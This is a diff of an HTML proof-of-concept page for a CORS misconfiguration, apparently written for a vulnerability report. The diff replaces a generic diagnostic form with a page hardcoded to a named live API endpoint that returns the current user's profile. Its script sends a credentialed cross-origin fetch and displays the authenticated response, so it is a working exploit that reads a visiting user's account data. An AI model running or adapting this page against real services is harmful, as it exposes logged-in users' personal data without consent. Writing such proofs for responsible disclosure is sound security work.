@@ -3,179 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Misconfiguration Poc</title>
-    <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            background-color: #f4f5f7; 
-            color: #333333; 
-            padding: 40px; 
-            margin: 0; 
-            display: flex; 
-            justify-content: center; 
-        }
-        .container { 
-            background: #ffffff; 
-            padding: 40px; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); 
-            max-width: 700px; 
-            width: 100%; 
-            border-top: 4px solid #0052cc; 
-            box-sizing: border-box;
-        }
-        h2 { margin-top: 0; color: #0052cc; font-size: 22px; font-weight: 600; }
-        p { line-height: 1.6; color: #5e6c84; font-size: 14px; margin-bottom: 20px; }
-        
-        .input-group { margin-bottom: 20px; }
-        label { display: block; font-size: 13px; font-weight: bold; color: #5e6c84; margin-bottom: 8px; }
-        input[type="text"] { 
-            width: 100%; 
-            padding: 12px; 
-            border: 1px solid #cccccc; 
-            border-radius: 4px; 
-            font-size: 14px; 
-            box-sizing: border-box;
-            font-family: monospace;
-        }
-        
-        .btn-action { 
-            display: inline-block; 
-            background-color: #0052cc; 
-            color: #ffffff; 
-            padding: 12px 24px; 
-            font-size: 14px; 
-            font-weight: 600; 
-            border: none; 
-            border-radius: 4px; 
-            cursor: pointer; 
-            width: 100%; 
-            text-align: center; 
-        }
-        .btn-action:hover { background-color: #0065ff; }
-        
-        /* Status Banner Panels */
-        .status-banner {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 4px;
-            font-size: 14px;
-            display: none;
-            line-height: 1.5;
-        }
-        .status-vulnerable { background-color: #f8d7da; color: #842029; border: 1px solid #f5c2c7; }
-        .status-mitigated { background-color: #d1e7dd; color: #0f5132; border: 1px solid #badbcc; }
-        
-        /* Educational Breakdown */
-        .explanation-box {
-            background-color: #ebf5ff;
-            border-left: 4px solid #0052cc;
-            padding: 15px;
-            margin-bottom: 25px;
-            border-radius: 0 4px 4px 0;
-        }
-        .explanation-box h4 { margin: 0 0 5px 0; color: #0052cc; font-size: 14px; }
-        .explanation-box ul { margin: 0; padding-left: 20px; font-size: 13px; color: #44546f; line-height: 1.5; }
+    <title>CORS Misconfiguration - Proof of Concept</title>
 
-        /* Data Output Text Box */
-        .output-title { font-size: 13px; font-weight: bold; color: #5e6c84; margin-top: 25px; margin-bottom: 5px; }
-        .response-box { 
-            background-color: #212529; 
-            color: #ced6e0; 
-            padding: 18px; 
-            border-radius: 4px; 
-            font-family: "SFMono-Regular", Consolas, "Liberation Mono", monospace; 
-            font-size: 13px; 
-            min-height: 80px; 
-            white-space: pre-wrap; 
-            word-break: break-all; 
-            border: 1px solid #3c4043;
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f4f6f8;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #222;
+        }
+
+        .container {
+            width: 650px;
+            background: #fff;
+            padding: 35px;
+            border: 1px solid #d9dfe5;
+            border-radius: 8px;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.08);
+        }
+
+        h1 {
+            margin-top: 0;
+            font-size: 24px;
+        }
+
+        .description {
+            color: #555;
+            line-height: 1.6;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            border: 0;
+            border-radius: 5px;
+            background: #1f6feb;
+            color: #fff;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #1558b0;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            background: #f4f6f8;
+            border-radius: 5px;
+        }
+
+        pre {
+            margin-top: 15px;
+            padding: 15px;
+            background: #1e1e1e;
+            color: #fff;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
         }
     </style>
 </head>
+
 <body>
 
 <div class="container">
-    <h2>CORS Misconfiguration & Cookie Boundary Diagnostic Suite</h2>
-    <p>This interactive verification interface evaluates target API endpoints across origins to identify operational policy configurations and analyze cross-site access vectors.</p>
-    
-    <div class="explanation-box">
-        <h4>Technical Policy Architecture:</h4>
-        <ul>
-            <li><strong>CORS Misconfiguration Vector:</strong> Present if the targeted host dynamics mirror arbitrary <code>Origin</code> parameters alongside active credential scopes.</li>
-            <li><strong>SameSite=Lax Control Barrier:</strong> Web browsers drop <code>SameSite=Lax</code> cookie headers during asynchronous cross-origin background sequences, neutralizing direct text readout.</li>
-        </ul>
+
+    <h1>CORS Misconfiguration - Proof of Concept</h1>
+
+    <p class="description">
+        This PoC demonstrates cross-origin access to the affected API endpoint.
+        The request is performed using the authenticated browser session.
+    </p>
+
+    <button id="pocButton">
+        Execute PoC
+    </button>
+
+    <div class="status" id="status">
+        Status: Waiting for execution
     </div>
 
-    <!-- Target Endpoint Input Selection -->
-    <div class="input-group">
-        <label for="apiUrl">TARGET API ENDPOINT SPECIFICATION URL:</label>
-        <input type="text" id="apiUrl" placeholder="https://target-domain.com" value="https://example.com">
-    </div>
+    <pre id="response">Response will appear here...</pre>
 
-    <button id="auditBtn" class="btn-action">Execute Policy Diagnostic Routine</button>
-
-    <!-- Dynamic Validation Status Elements -->
-    <div id="vulnerableBanner" class="status-banner status-vulnerable">
-        <strong>⚠️ CORS POLICY EXPOSURE IDENTIFIED</strong><br>
-        The request successfully completed and allowed data exfiltration. The target host's loose CORS parameter rules allowed cross-origin scripting layers to read raw data attributes.
-    </div>
-    <div id="mitigatedBanner" class="status-banner status-mitigated">
-        <strong>✅ SECURITY COMPENSATING CONTROL ACTIVE</strong><br>
-        A backend CORS misconfiguration may exist, but data readout was successfully blocked. The browser's native <code>SameSite=Lax</code> security structure prevented credential transmission.
-    </div>
-
-    <!-- On-Screen Extracted Server Data Display -->
-    <div class="output-title">CAPTURED SERVER DATA RESPONSE STRINGS:</div>
-    <pre id="responseOutput" class="response-box">Input an endpoint scope and execute the diagnostic routine...</pre>
 </div>
 
 <script>
-    document.getElementById('auditBtn').addEventListener('click', () => {
-        const outBox = document.getElementById('responseOutput');
-        const vBanner = document.getElementById('vulnerableBanner');
-        const mBanner = document.getElementById('mitigatedBanner');
-        const targetUrlPath = document.getElementById('apiUrl').value.trim();
-        
-        // Basic schema alignment assertion
-        if (!targetUrlPath || !targetUrlPath.startsWith("http")) {
-            outBox.innerText = "Error: A valid HTTP/HTTPS URL framework specification must be provided.";
-            outBox.style.color = "#ff4757";
-            return;
+    const targetUrl =
+        "https://ocean.medishout.co.uk/v1/users/me/?platform=web";
+
+    document.getElementById("pocButton").addEventListener("click", async function () {
+
+        const status = document.getElementById("status");
+        const output = document.getElementById("response");
+
+        status.textContent = "Status: Sending cross-origin request...";
+
+        try {
+            const response = await fetch(targetUrl, {
+                method: "GET",
+                credentials: "include"
+            });
+
+            const body = await response.text();
+
+            status.textContent =
+                "Status: Response successfully accessed (" +
+                response.status +
+                ")";
+
+            output.textContent = body;
+
+        } catch (error) {
+
+            status.textContent =
+                "Status: Cross-origin response could not be accessed";
+
+            output.textContent =
+                "Browser error: " + error.message;
         }
-
-        // Initialize state visuals
-        outBox.innerText = `Dispatching credentialed query stream to: ${targetUrlPath}...`;
-        outBox.style.color = "#ffc107";
-        vBanner.style.display = "none";
-        mBanner.style.display = "none";
-
-        fetch(targetUrlPath, {
-            method: "GET",
-            credentials: "include" // Proactively requests the browser to inherit session attributes
-        })
-        .then(response => {
-            // Unauthenticated response codes isolate SameSite interception boundaries
-            if (response.status === 401 || response.status === 403) {
-                throw new Error(`HTTP Session Revoked: Status ${response.status} (Access Unauthorized - Session Credentials Omitted by Browser)`);
-            }
-            if (!response.ok) {
-                throw new Error(`Network Transport Error: Status ${response.status}`);
-            }
-            return response.text();
-        })
-        .then(capturedPayload => {
-            // Script cleanly accessed the response stream
-            outBox.innerText = capturedPayload;
-            outBox.style.color = "#2ed573";
-            vBanner.style.display = "block";
-        })
-        .catch(runtimeFault => {
-            // SameSite tracking rules or CORS isolation rules intercepted execution
-            outBox.innerText = `[Diagnostic Process Concluded]\n\nExecution State: ${runtimeFault.message}`;
-            outBox.style.color = "#ff4757";
-            mBanner.style.display = "block";
-        });
     });
 </script>
 
